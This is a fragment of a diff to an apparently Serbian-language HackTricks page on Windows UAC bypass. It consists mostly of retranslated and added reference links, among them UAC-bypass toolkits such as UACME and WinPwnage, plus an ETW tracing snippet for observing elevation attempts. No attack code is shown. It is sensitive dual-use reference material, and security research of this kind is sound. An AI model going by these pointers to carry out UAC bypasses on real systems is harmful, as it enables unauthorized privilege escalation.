 logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
 rem reproduce the elevation attempt
 logman stop AdminProtectionTrace -ets
 ```
+
+
+
 ## References
 
 - [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
 - [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
-- [3] [UACME – Kolekcija UAC bypass tehnika](https://github.com/hfiref0x/UACME)
-- [4] [WinPwnage – Skener kompatibilnosti i launcher za UAC bypass](https://github.com/rootm0s/WinPwnage)
-- [5] [Checkpoint Research – KONNI usvaja AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
-- [6] [Check Point Research – Operacija TrueChaos: 0-Day exploitation protiv meta među vladama jugoistočne Azije](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [7] [Project Zero – Zaobilaženje Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
-- [8] [Sigma / Detection.FYI – UAC bypass pomoću SilentCleanup task-a](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
-- [9] [R41N3RZUF477 – UnifiedConsent, TabTip i Narrator Always Notify bypass metode](https://github.com/hfiref0x/UACME/issues/173)
+- [3] [UACME – Kolekcija tehnika za zaobilaženje UAC-a](https://github.com/hfiref0x/UACME)
+- [4] [WinPwnage – Skener kompatibilnosti i pokretač za zaobilaženje UAC-a](https://github.com/rootm0s/WinPwnage)
+- [5] [Checkpoint Research – KONNI koristi AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
+- [6] [Check Point Research – Operacija TrueChaos: iskorišćavanje 0-day ranjivosti protiv državnih meta u jugoistočnoj Aziji](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
+- [7] [Project Zero – Zaobilaženje Windows Administrator Protection-a](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [8] [Sigma / Detection.FYI – Zaobilaženje UAC-a pomoću zadatka SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
+- [9] [R41N3RZUF477 – Zaobilaženja UnifiedConsent, TabTip i Narrator opcije „Uvek obaveštavaj“](https://github.com/hfiref0x/UACME/issues/173)
 - [10] [Microsoft Learn – Zaštita administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
 - [11] [Google Project Zero – Pozivanje lokalnih Windows RPC servera iz .NET-a](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
 - [12] [Kaspersky Securelist – HoneyMyte unapređuje CoolClient potpisanim Windows kernel rootkit-om](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
+- [13] [Group-IB – KGB RAT: potpuno neotkriveni Windows trojanac napravljen za špijuniranje, krađu i terorisanje](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
+- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
 {{#include ../../banners/hacktricks-training.md}}
